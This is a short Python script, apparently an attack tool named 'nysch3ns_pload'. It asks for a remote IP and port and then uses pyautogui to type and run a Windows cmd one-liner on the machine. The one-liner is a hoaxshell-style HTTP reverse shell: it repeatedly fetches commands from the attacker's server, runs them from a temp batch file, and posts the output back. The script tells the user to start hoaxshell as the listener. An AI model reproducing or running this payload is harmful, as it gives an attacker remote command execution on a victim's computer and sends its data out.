import pyautogui
import pyfiglet
ascii_banner=pyfiglet.figlet_format("nysch3ns_pload")
print(ascii_banner)
print("START SCRIPT BY CMD!!!")
print("="*50)
target=input(str(">>Remote IP: "))
port=input(str(">>Remote PORT: "))
print("="*50)
command=('cmd /V:ON /C "SET ip=targetIP:targetPORT&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL')
change1 = command.replace("targetIP", target).replace("targetPORT", port)
pyautogui.write(change1)
pyautogui.hotkey('enter')

print("-"*50)
print("Download hoaxshell by t3l3machus from GitHub to listen")
print("-"*50)
print("DONT CLOSE THIS WINDOW!!!")